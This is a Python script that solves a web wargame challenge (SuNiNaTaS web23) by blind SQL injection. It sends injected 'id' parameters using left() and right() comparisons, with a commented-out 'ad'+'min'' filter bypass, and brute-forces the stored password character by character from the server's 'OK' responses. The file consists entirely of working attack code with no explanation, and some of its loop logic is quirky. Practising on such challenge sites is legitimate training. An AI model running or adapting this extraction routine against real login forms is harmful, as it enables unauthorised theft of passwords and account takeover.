#pw length: id에 ad'+'min' and len(pw)>10--
import requests

host = "http://suninatas.com"

##id_payload = "ad'+'min' and left(pw,1)='1'--"

##fullstring=""
##
##for i in range(1,13):
##    id_payload = id_payload[:22] + str(i) + id_payload[23:]
##    for j in range(33,127):
##        fullstring+=chr(j).lower()
##        if i>10 :
##            id_payload = id_payload[:27] + str(fullstring) + "'--"
##        else:
##            id_payload = id_payload[:26] + str(fullstring) + "'--"
##        print(id_payload)
##        payload = {'id': id_payload , 'pw': '1'}
##        r = requests.get(host+"/challenge/web23/web23.asp",params=payload)
##        #print(r.content)
##
##        if (r.text.find('OK')) != -1:
##            print(fullstring)
##        else:
##            fullstring=fullstring[:-1]
##
##
##
##print(fullstring)




id_payload_left = "'or left(pw,1)='1'--"

fullstring_left=""

for i in range(1,13):
    id_payload_left = id_payload_left[:12] + str(i) + id_payload_left[13:]
    for j in range(33,127):
        fullstring_left+=chr(j).lower()
        id_payload_left = id_payload_left[:16] + str(fullstring_left) + "'--"
        payload = {'id': id_payload_left , 'pw': '1'}
        r = requests.get(host+"/challenge/web23/web23.asp",params=payload)

        if (r.text.find('OK')) != -1:
            if((i==1) & (j==71)):
                fullstring_left=""
                j+=1
            else:
                break
        else:
            fullstring_left=fullstring_left[:-1]



id_payload_right = "'or right(pw,1)='1'--"

fullstring_right=""

for i in range(1,4):
    id_payload_right = id_payload_right[:13] + str(i) + id_payload_right[14:]
    for j in range(33,127):
        fullstring_right+=chr(j).lower()
        reversed_str = "".join(reversed(fullstring_right))
        id_payload_right = id_payload_right[:17] + str(reversed_str) + "'--"
        payload = {'id': id_payload_right , 'pw': '1'}
        r = requests.get(host+"/challenge/web23/web23.asp",params=payload)

        if (r.text.find('OK')) != -1:
                break
        else:
            fullstring_right=fullstring_right[:-1]



print(fullstring_left+reversed_str)


